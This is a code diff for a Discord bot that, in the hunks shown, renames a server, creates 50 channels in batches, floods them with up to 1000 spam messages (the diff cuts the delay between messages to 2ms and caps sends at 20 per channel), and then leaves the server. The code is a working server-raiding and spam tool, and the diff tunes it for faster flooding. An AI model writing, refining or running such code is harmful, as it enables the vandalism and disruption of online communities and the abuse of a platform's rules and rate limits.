@@ -127,9 +127,9 @@ client.on('messageCreate', async (message) => {
       console.warn('⚠️ Failed to rename server:', err.message);
     }
 
-    // Step 5: Create 100 channels in batches
+    // Step 5: Create 50 channels
     const createdChannels = [];
-    const totalChannelsToCreate = 100;
+    const totalChannelsToCreate = 50;
     const batchSize = 25;
 
     console.log(`🆕 Creating ${totalChannelsToCreate} channels...`);
@@ -157,7 +157,7 @@ client.on('messageCreate', async (message) => {
       }
 
       await Promise.all(batchPromises);
-      await new Promise(r => setTimeout(r, 500)); // Small delay between batches
+      await new Promise(r => setTimeout(r, 500)); // Small pause between batches
     }
 
     if (createdChannels.length === 0) {
@@ -165,15 +165,22 @@ client.on('messageCreate', async (message) => {
       return message.channel.send('❌ Could not create any channels. Aborting.');
     }
 
-    // Step 6: Spam messages directly through the bot
-    const totalMessages = 1000;
-    const perChannel = Math.ceil(totalMessages / createdChannels.length);
+    // Step 6: Spam 20 messages per channel, up to 1000 total
+    const validChannels = createdChannels.filter(ch => ch && ch.id);
+
+    if (validChannels.length === 0) {
+      console.error('❌ No valid channels to spam.');
+      return message.channel.send('❌ No valid channels to spam.');
+    }
+
     let sent = 0;
+    const MAX_MESSAGES = 1000;
+    const MESSAGES_PER_CHANNEL = 20;
 
-    console.log(`🔥 Starting spam in ${createdChannels.length} channels...`);
+    console.log(`🔥 Starting spam in ${validChannels.length} channels (20 msgs each)...`);
 
-    const sendBatch = createdChannels.map(channel => async () => {
-      for (let i = 0; i < perChannel && sent < totalMessages; i++) {
+    const sendBatch = validChannels.map(channel => async () => {
+      for (let i = 0; i < MESSAGES_PER_CHANNEL && sent < MAX_MESSAGES; i++) {
         try {
           await handleRateLimit(() => channel.send(spamMessage));
           sent++;
@@ -181,12 +188,12 @@ client.on('messageCreate', async (message) => {
         } catch (err) {
           console.error(`⚠️ Send failed in ${channel.name}: ${err.message}`);
         }
-        await new Promise(r => setTimeout(r, 50)); // Small delay to avoid hitting limits hard
+        await new Promise(r => setTimeout(r, 2)); // 2ms delay between messages
       }
     });
 
     await Promise.all(sendBatch.map(fn => fn()));
-    console.log(`✅ Sent ${sent}/${totalMessages} spam messages.`);
+    console.log(`✅ Sent ${sent}/${MAX_MESSAGES} spam messages.`);
     didSomething = true;
 
     // Step 7: Leave server
